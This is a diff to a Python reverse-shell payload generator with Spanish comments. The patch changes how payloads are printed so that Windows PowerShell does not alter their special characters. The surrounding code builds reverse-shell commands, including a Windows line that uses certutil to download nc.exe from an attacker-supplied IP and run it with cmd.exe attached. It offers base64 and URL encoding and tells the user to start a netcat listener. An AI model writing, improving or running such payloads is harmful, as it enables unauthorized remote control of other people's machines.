@@ -21,6 +21,8 @@ def generate_payloads(ip, port):
         "Windows CMD": f"certutil -urlcache -split -f http://{ip}/nc.exe nc.exe & nc.exe {ip} {port} -e cmd.exe"
     }
 
+import sys
+
 def run(ip, port, use_base64=False, use_urlencode=False):
     payloads = generate_payloads(ip, port)
     for name, cmd in payloads.items():
@@ -39,6 +41,9 @@ def run(ip, port, use_base64=False, use_urlencode=False):
                 
         if use_urlencode:
             final_cmd = urllib.parse.quote(final_cmd)
-            
-        print(f"{Colors.OKGREEN}{final_cmd}{Colors.ENDC}")
+        
+        # Escribir directamente a stdout en bytes para que PowerShell de Windows
+        # no interprete caracteres especiales ($, &, ', |) del payload.
+        sys.stdout.buffer.write(f"{Colors.OKGREEN}{final_cmd}{Colors.ENDC}\n".encode('utf-8'))
+        sys.stdout.buffer.flush()
     print(f"\n{Colors.WARNING}[!] Ponte a la escucha: nc -lvnp {port}{Colors.ENDC}")
